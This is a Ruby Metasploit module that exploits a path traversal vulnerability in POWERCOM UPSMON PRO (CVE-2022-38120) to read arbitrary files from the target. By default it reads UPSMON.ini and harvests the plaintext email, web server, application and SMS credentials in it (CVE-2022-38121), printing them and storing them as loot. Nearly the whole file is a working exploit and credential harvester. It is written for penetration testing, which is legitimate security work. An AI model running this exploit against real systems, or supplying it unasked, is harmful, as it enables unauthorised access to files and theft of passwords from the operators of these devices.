##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'POWERCOM UPSMON PRO Path Traversal (CVE-2022-38120) and Credential Harvester (CVE-2022-38121)',
        'Description' => %q{
          This module exploits a path traversal vulnerability in UPSMON PRO <= v2.61 to retrieve arbitrary files from the system.
          By default, the configuration file will be retrieved, which contains the credentials (CVE-2022-38121) for the web service, mail server, application, and SMS service.
          However, any arbitrary file can be specified.
        },
        'Author' => [
          'Michael Heinzl'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-38120'],
          ['CVE', '2022-38121'],
          ['URL', 'https://www.twcert.org.tw/en/cp-139-6686-4041f-2.html'],
          ['URL', 'https://www.twcert.org.tw/en/cp-139-6687-cbce6-2.html']
        ],
        'DisclosureDate' => '2022-11-10',
        'DefaultOptions' => {
          'RPORT' => 8000,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for UPSMON PRO', '/']),
        OptString.new('FILE', [false, 'The file path to read from the target system, e.g., /Users/Public/UPSMON-Pro/UPSMON.ini', '/Users/Public/UPSMON-Pro/UPSMON.ini']),
        OptInt.new('DEPTH', [ true, 'The traversal depth. The FILE path will be prepended with ../ * DEPTH', 4 ])
      ]
    )
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'index.html ')
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      return CheckCode::Unknown('Connection failed')
    end

    if res&.code == 200
      data = res.to_s
      if data.include?('My Web Server 1') && data.include?('UPSMON PRO WEB')
        return CheckCode::Detected('UPSMON PRO Web seems to be running on target system.')
      end

      return CheckCode::Safe
    end
    return CheckCode::Unknown
  end

  def print_ini_field(label, value)
    print_status("#{label}: #{value.nil? || value.empty? ? '(not configured)' : value}")
  end

  def run
    traversal = '../' * datastore['DEPTH'] + datastore['FILE']
    traversal = traversal.gsub(%r{/+}, '/')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, traversal)
    })

    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server. If you believe the path is correct, try increasing the path traversal depth.') if res&.code != 200
    print_good("File retrieved: #{target_uri.path}#{traversal}")

    data = res.body

    if traversal.downcase.end_with?('upsmon.ini')
      print_status('UPSMON.ini specified, parsing credentials:')

      begin
        parser = Rex::Parser::Ini.new
        parser.from_s(data)

        email_creds = parser['Email'] || {}
        webserver_creds = parser['WebServer'] || {}
        main_creds = parser['Main'] || {}
        sms_creds = parser['SMS'] || {}

        smtp = email_creds['SMTP']
        port = email_creds['Port']
        username = email_creds['UserName']
        password = email_creds['Password']

        print_ini_field('SMTP', smtp)
        print_ini_field('Port', port)
        print_ini_field('UserName', username)
        print_ini_field('Password', password)

        if username && password
          store_valid_credential(
            user: username,
            private: password,
            private_type: :password
          )
        end

        web_user = webserver_creds['UserName']
        web_pass = webserver_creds['Password']
        print_ini_field('WebServer UserName', webserver_creds['UserName'])
        print_ini_field('WebServer Password', webserver_creds['Password'])

        if web_user && web_pass
          store_valid_credential(
            user: web_user,
            private: web_pass,
            private_type: :password
          )
        end

        app_pass = main_creds['AppPassword']
        print_ini_field('Main AppPassword', main_creds['AppPassword'])

        if app_pass
          store_valid_credential(
            user: 'AppUser',
            private: app_pass,
            private_type: :password
          )
        end

        sms_user = sms_creds['UserName']
        sms_pass = sms_creds['Password']
        print_ini_field('SMS UserName', sms_creds['UserName'])
        print_ini_field('SMS Password', sms_creds['Password'])
        print_ini_field('UPS Name', sms_creds['UPSName'])
        print_ini_field('Phone Number', sms_creds['PhoneNum'])

        if sms_user && sms_pass
          store_valid_credential(
            user: sms_user,
            private: sms_pass,
            private_type: :password
          )
        end
      rescue StandardError => e
        print_error("Failed to parse INI data: #{e.message}")
      end

    end

    path = store_loot(File.basename(datastore['FILE']), 'text/plain', datastore['RHOSTS'], data, datastore['FILE'], 'File retrieved through UPSMON PRO path traversal.')
    print_status("File saved as loot: #{path}")
  end
end
